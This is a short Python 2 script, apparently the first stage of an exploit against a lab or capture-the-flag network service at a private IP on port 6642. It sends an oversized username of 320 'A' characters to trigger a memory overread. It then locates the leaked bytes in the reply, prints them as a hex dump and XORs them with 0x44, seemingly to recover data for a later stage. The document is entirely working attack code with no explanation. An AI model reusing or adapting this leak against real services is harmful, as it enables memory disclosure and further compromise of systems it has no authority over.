#!/usr/bin/python
import socket

HOST='192.168.56.103'
PORT=6642

NUM=0

def stage1():
    log = 'A' * 320 + '\n' + 'B' * 320
    pas = 'B' * 320
    return log, pas

def interpret_stage1(s):
    pos = 0
    for i in range(len(s)):
        c = ord(s[i])
        if (c < 0x20 or c > 0x7e) and c != 0x0a:
            pos = i
            break  
    pos += 40
    pos2 = s[pos:].find('\nEnter your username') + pos
    pos2 -= 0
    leak = [ x for x in s[pos:pos2]]
    print 'Leaked: '
    print hex_dump(leak)

    print 'After XORing with 0x44:'
    xored = []
    for x in leak:
        xored.append(chr(ord(x) ^ 0x44))
    print hex_dump(xored)

def hex_dump(data):
    s = ''
    n = 0
    lines = []

    if len(data) == 0:
        return '<empty>'

    for i in range(0, len(data), 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % ord(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (ord(data[j]) < 0x20 or ord(data[j]) > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)

def recv(sock, mute = False):
    global NUM
    ret = sock.recv(1024)
    NUM = NUM+1
    if not mute:
        print 'Recv %02d.: "%s"' % (NUM, ret)
        print hex_dump(ret)
        print
    return ret

if __name__ == '__main__':

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST,PORT))
    recv(sock, True)
    recv(sock, True)

    login1, pass1 = stage1()

    sock.sendall(login1 + '\n')
    recv(sock, True)
    ret = recv(sock, True)
    interpret_stage1(ret)

    sock.close()
